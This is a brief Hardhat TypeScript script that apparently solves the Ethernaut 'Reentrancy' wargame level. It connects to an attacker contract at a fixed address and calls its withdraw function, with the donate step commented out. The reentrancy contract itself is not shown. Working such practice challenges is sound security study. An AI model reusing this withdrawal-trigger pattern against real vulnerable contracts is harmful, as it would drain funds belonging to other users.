import { ethers } from 'hardhat';
import EthernautReentrancy from '../artifacts/contracts/Reentrancy.sol/EthernautReentrancy.json';

const contractAddress = '0x50F4f979a3AFfF8e7F90E8AB2190791385e99B4b';

async function runReentrancy() {
  try {
    let txn: any;
    const signer = ethers.provider.getSigner();
    const contract = await ethers.getContractAt(EthernautReentrancy.abi, contractAddress, signer);
    
    // txn = await contract.donate({value: ethers.utils.parseEther('0.002'), gasLimit: 2000000});
    // console.log(`Transaction ${txn.hash} sent to blockchain...`);
    // await txn.wait();
    // console.log(`Transaction mined`);

    txn = await contract.withdraw(ethers.utils.parseEther('0.001'));
    console.log(`Transaction ${txn.hash} sent to blockchain...`);
    await txn.wait();
    console.log(`Transaction mined`);

  } catch (error) {
    console.error(error);
  }
};

runReentrancy().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

